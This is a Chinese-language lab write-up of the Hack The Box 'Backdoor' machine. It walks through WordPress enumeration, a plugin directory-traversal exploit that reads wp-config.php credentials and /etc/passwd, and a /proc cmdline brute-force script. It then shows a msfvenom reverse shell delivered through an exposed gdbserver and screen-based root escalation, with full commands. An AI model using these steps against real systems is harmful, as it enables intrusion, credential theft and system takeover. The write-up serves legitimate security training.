nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291304431.png)

把`10.10.11.125    backdoor.htb `加到`/etc/hosts`中

---

`WordPress 5.8.1`用`wpscan`去扫描,可知`http://10.10.11.125/wp-content/uploads/`可以列出文件

用gobuster去爆破路径

`./gobuster dir -w /home/kali/SecTools/SecLists-2021.4/Discovery/Web-Content/directory-list-2.3-small.txt -u http://backdoor.htb/ -t 100`

```
/wp-content           (Status: 301) [Size: 317] [--> http://backdoor.htb/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://backdoor.htb/wp-includes/]
/wp-admin             (Status: 301) [Size: 315] [--> http://backdoor.htb/wp-admin/] 
```

`./gobuster dir -w /home/kali/SecTools/SecLists-2021.4/Discovery/Web-Content/directory-list-2.3-small.txt -u http://backdoor.htb/wp-content/ -t 100`

```
/themes               (Status: 301) [Size: 324] [--> http://backdoor.htb/wp-content/themes/]
/uploads              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/uploads/]
/plugins              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/plugins/]
/upgrade              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/upgrade/]
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291331900.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291337365.png)

`/wp-content/plugins/ebook-download/filedownload.php`可能存在文件下载

但是`wfuzz`没有fuzz出来...

`wfuzz -c -w ~/SecTools/SecLists-2021.4/Discovery/Web-Content/burp-parameter-names.txt -u "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?FUZZ=../../../../../../../../etc/passwd"`

从[http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt](http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt)得知该版本为`1.1`

有个任意文件下载漏洞[WordPress Plugin eBook Download 1.1 - Directory Traversal ](https://www.exploit-db.com/exploits/39575)

参数是`ebookdownloadurl`,字典里面没有这个...

`http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=`

`wp-config.php`

```
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

`/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

尝试用`MQYBJSaD#DxG6qbm`去登录ssh和登录后台均失败

`hello.php`没啥用的插件...

尝试去爆破`/proc/xxx/cmdline`

```python
import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'}
url="http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../proc/%s/cmdline"

for i in range(50000):
    r=requests.get(url=url%str(i),headers=headers)
    cmdline=r.text[r.text.index('cmdline',100)+7:r.text.index('<script>window.close()</script>')]
    if cmdline=='':
        continue
    else:
        print(i,cmdline)
```

```
1 /sbin/initautoautomatic-ubiquitynoprompt
486 /lib/systemd/systemd-journald
513 /lib/systemd/systemd-udevd
528 /lib/systemd/systemd-networkd
658 /sbin/multipathd-d-s
659 /sbin/multipathd-d-s
660 /sbin/multipathd-d-s
661 /sbin/multipathd-d-s
662 /sbin/multipathd-d-s
663 /sbin/multipathd-d-s
664 /sbin/multipathd-d-s
684 /lib/systemd/systemd-resolved
687 /lib/systemd/systemd-timesyncd
692 /usr/bin/VGAuthService
698 /usr/bin/vmtoolsd
752 /lib/systemd/systemd-timesyncd
753 /usr/bin/vmtoolsd
754 /usr/bin/vmtoolsd
755 /usr/lib/accountsservice/accounts-daemon
757 /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only
758 /usr/bin/vmtoolsd
762 /usr/lib/accountsservice/accounts-daemon
770 /usr/sbin/irqbalance--foreground
771 /usr/bin/python3/usr/bin/networkd-dispatcher--run-startup-triggers
774 /usr/sbin/irqbalance--foreground
776 /usr/sbin/rsyslogd-n-iNONE
780 /lib/systemd/systemd-logind
794 /usr/sbin/rsyslogd-n-iNONE
795 /usr/sbin/rsyslogd-n-iNONE
796 /usr/sbin/rsyslogd-n-iNONE
829 /usr/sbin/cron-f
831 /usr/sbin/CRON-f
832 /usr/sbin/CRON-f
846 /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
849 /bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
859 /usr/sbin/atd-f
866 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
884 /usr/sbin/apache2-kstart
916 /usr/lib/accountsservice/accounts-daemon
937 /sbin/agetty-o-p -- \u--nocleartty1linux
944 /usr/sbin/mysqld
950 /usr/lib/policykit-1/polkitd--no-debug
953 /usr/lib/policykit-1/polkitd--no-debug
955 /usr/lib/policykit-1/polkitd--no-debug
979 /lib/systemd/systemd--user
980 (sd-pam)
1015 /usr/sbin/mysqld
1018 /usr/sbin/mysqld
1019 /usr/sbin/mysqld
1020 /usr/sbin/mysqld
...
```

注意到有个`gdbserver`监听在`1337`端口,可以利用这个`gdbserver`去getshell

[GNU gdbserver 9.2 - Remote Command Execution (RCE) ](https://www.exploit-db.com/exploits/50539)

```
Usage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291939107.png)

---

也可以手动getshell

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=4000 -f elf -o /tmp/rev`生成反弹文件,同时在`4000`端口开启监听

在本地开启`gdb`,同时设置远程连接`target extended-remote 10.10.11.125:1337`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291948492.png)

```
cd /tmp
remote put rev rev
set remote exec-file /home/user/rev
run
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291953687.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291955494.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291955990.png)

---

在`~/.ssh`下面加个`authorized_keys`以便ssh连接

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201291943681.png)

```
find / -user root -perm -4000 -print 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
```

结合前面读取`proc`时的结果`846 /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done`

利用`/usr/bin/screen`进行提权

帮助文档

```
-x            Attach to a not detached screen. (Multi display mode).
```

执行`screen -x root/root`即可

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292007110.png)